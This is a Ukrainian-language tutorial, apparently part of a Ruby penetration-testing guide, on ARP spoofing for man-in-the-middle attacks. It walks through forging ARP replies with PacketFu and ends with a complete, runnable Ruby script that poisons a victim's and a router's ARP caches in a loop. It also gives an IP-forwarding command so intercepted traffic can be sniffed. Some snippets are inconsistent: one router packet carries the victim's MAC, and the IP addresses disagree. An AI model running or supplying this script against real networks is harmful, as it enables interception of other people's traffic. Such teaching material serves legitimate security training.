# Підміна ARP
Як ви знаєте, атака з підміною ARP(ARP Spoofing attack) це ядро атаки під назвою "Людина в середині"(MitM attacks). В цій частині ми дізнаємося як написати простий але ефективний підмінювач ARP та використаємо його пізніше для спуфінг атаки.

#### Сценарій
В цьому сценарії у нас є три машини, розташовані як показано нижче:
```
             |Нападник|
                 |
                 ٧
|Жертва| -----------------> |Роутер| ---> Інтернет
```
Список IP та MAC адрес кожної з них у наступній таблиці[^1]

| Хост/Інфо |   IP Адреса   |    MAC Адреса     |
|-----------|:-------------:|:-----------------:|
| Нападник  | 192.168.0.100 | 3C:77:E6:68:66:E9 |
| Жертва    | 192.168.0.21  | 00:0C:29:38:1D:61 |
| Роутер    | 192.168.0.1   | 00:50:7F:E6:96:20 |

Щоб отримати інформацію про наш інтерфейс(інтерфейс нападника) використаємо наступний код:

```ruby
info = PacketFu::Utils.whoami?(:iface => "wlan0")
```
І він поверне щось типу:
```
{:iface=>"wlan0",
 :pcapfile=>"/tmp/out.pcap",
 :eth_saddr=>"3c:77:e6:68:66:e9",
 :eth_src=>"<w\xE6hf\xE9",
 :ip_saddr=>"192.168.0.13",
 :ip_src=>3232235533,
 :ip_src_bin=>"\xC0\xA8\x00\r",
 :eth_dst=>"\x00P\x7F\xE6\x96 ",
 :eth_daddr=>"00:50:7f:e6:96:20"}
```
Отже ви можете використовувати цю інформацію і брати її з хешів`info[:iface]`, `info[:ip_saddr]`, `info[:eth_saddr]`, і таке інше..


**Побудова ARP пакету для жертви**
```ruby
# Створемо заголовки
arp_packet_victim = PacketFu::ARPPacket.new
arp_packet_victim.eth_saddr = "3C:77:E6:68:66:E9"       # наша MAC адреса
arp_packet_victim.eth_daddr = "00:0C:29:38:1D:61"       # MAC адреса жертви
# Та додамо пакети
arp_packet_victim.arp_saddr_mac = "3C:77:E6:68:66:E9"   # наша MAC адреса
arp_packet_victim.arp_daddr_mac = "00:0C:29:38:1D:61"   # MAC адреса жертви
arp_packet_victim.arp_saddr_ip = "192.168.0.1"          # IP роутера
arp_packet_victim.arp_daddr_ip = "192.168.0.21"         # IP жертви
arp_packet_victim.arp_opcode = 2                        # код  arp 2 це ARP відповідь
```

**Побудова пакету для роутера**
```ruby
# Створемо заголовки
arp_packet_router = PacketFu::ARPPacket.new
arp_packet_router.eth_saddr = "3C:77:E6:68:66:E9"       # наша MAC адреса
arp_packet_router.eth_daddr = "00:0C:29:38:1D:61"       # MAC адреса роутера
# Та додамо ARP пакет
arp_packet_router.arp_saddr_mac = "3C:77:E6:68:66:E9"   # наша MAC адреса
arp_packet_router.arp_daddr_mac = "00:50:7F:E6:96:20"   # MAC адреса роутера
arp_packet_router.arp_saddr_ip = "192.168.0.21"         # IP жертви
arp_packet_router.arp_daddr_ip = "192.168.0.1"          # IP роутера
arp_packet_router.arp_opcode = 2                        # код  arp 2 це ARP відповідь

```

**Робимо спуфінг атаку на ARP**
```ruby
# Відправляємо наш пакет у мережу
while true
    sleep 1
    puts "[+] Sending ARP packet to victim: #{arp_packet_victim.arp_daddr_ip}"
    arp_packet_victim.to_w(info[:iface])
    puts "[+] Sending ARP packet to router: #{arp_packet_router.arp_daddr_ip}"
    arp_packet_router.to_w(info[:iface])
end
```
Джерело[^2]

Беремо все це разом і виконуємо від імені користувача `root`

```ruby
#!/usr/bin/env ruby
#
# ARP Spoof Basic script
#
require 'packetfu'

attacker_mac = "3C:77:E6:68:66:E9"
victim_ip    = "192.168.0.21"
victim_mac   = "00:0C:29:38:1D:61"
router_ip    = "192.168.0.1"
router_mac   = "00:50:7F:E6:96:20"

info = PacketFu::Utils.whoami?(:iface => "wlan0")
#
# Victim
#
# Build Ethernet header
arp_packet_victim = PacketFu::ARPPacket.new
arp_packet_victim.eth_saddr = attacker_mac        # attacker MAC address
arp_packet_victim.eth_daddr = victim_mac          # the victim's MAC address
# Build ARP Packet
arp_packet_victim.arp_saddr_mac = attacker_mac    # attacker MAC address
arp_packet_victim.arp_daddr_mac = victim_mac      # the victim's MAC address
arp_packet_victim.arp_saddr_ip = router_ip        # the router's IP
arp_packet_victim.arp_daddr_ip = victim_ip        # the victim's IP
arp_packet_victim.arp_opcode = 2                  # arp code 2 == ARP reply

#
# Router
#
# Build Ethernet header
arp_packet_router = PacketFu::ARPPacket.new
arp_packet_router.eth_saddr = attacker_mac        # attacker MAC address
arp_packet_router.eth_daddr = router_mac          # the router's MAC address
# Build ARP Packet
arp_packet_router.arp_saddr_mac = attacker_mac    # attacker MAC address
arp_packet_router.arp_daddr_mac = router_mac      # the router's MAC address
arp_packet_router.arp_saddr_ip = victim_ip        # the victim's IP
arp_packet_router.arp_daddr_ip = router_ip        # the router's IP
arp_packet_router.arp_opcode = 2                  # arp code 2 == ARP reply

while true
    sleep 1
    puts "[+] Sending ARP packet to victim: #{arp_packet_victim.arp_daddr_ip}"
    arp_packet_victim.to_w(info[:iface])
    puts "[+] Sending ARP packet to router: #{arp_packet_router.arp_daddr_ip}"
    arp_packet_router.to_w(info[:iface])
end

```

> Note: Don't forget to enable packet forwarding on your system to allow victim to browse internet.

> `echo "1" > /proc/sys/net/ipv4/ip_forward `

Returns, time to wiresharking ;)
```
[+] Sending ARP packet to victim: 192.168.0.21
[+] Sending ARP packet to router: 192.168.0.1
.
.
.
[+] Sending ARP packet to victim: 192.168.0.21
[+] Sending ARP packet to router: 192.168.0.1
[+] Sending ARP packet to victim: 192.168.0.21
[+] Sending ARP packet to router: 192.168.0.1
```



<br><br><br>
---
[^1]: Create table the easy way - [Table Generator](http://www.tablesgenerator.com/markdown_tables)

[^2]: Source: [DNS Spoofing Using PacketFu](http://crushbeercrushcode.org/2012/10/ruby-dns-spoofing-using-packetfu/)
